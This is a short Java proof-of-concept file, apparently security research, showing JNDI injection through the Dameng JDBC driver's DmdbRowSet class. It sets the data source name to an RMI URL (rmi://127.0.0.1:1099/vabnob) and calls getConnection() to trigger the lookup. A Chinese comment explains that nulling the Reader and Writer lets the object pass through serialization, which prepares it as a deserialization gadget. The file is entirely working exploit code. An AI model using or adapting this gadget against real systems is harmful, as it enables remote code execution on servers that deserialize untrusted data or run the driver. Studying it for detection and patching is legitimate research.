package dameng;

import dm.jdbc.driver.DmdbRowSet;

/**
 * @author Whoopsunix
 */
public class JNDI {
    public static void main(String[] args) {
        DmdbRowSet dmdbRowSet = new DmdbRowSet();
        dmdbRowSet.setDataSourceName("rmi://127.0.0.1:1099/vabnob");
        // 设置 Reader 和 Writer 为 null，使得 writeObject 时忽略掉这2个不可序列化的field
        dmdbRowSet.setReader(null);
        dmdbRowSet.setWriter(null);

        dmdbRowSet.getConnection();
    }
}
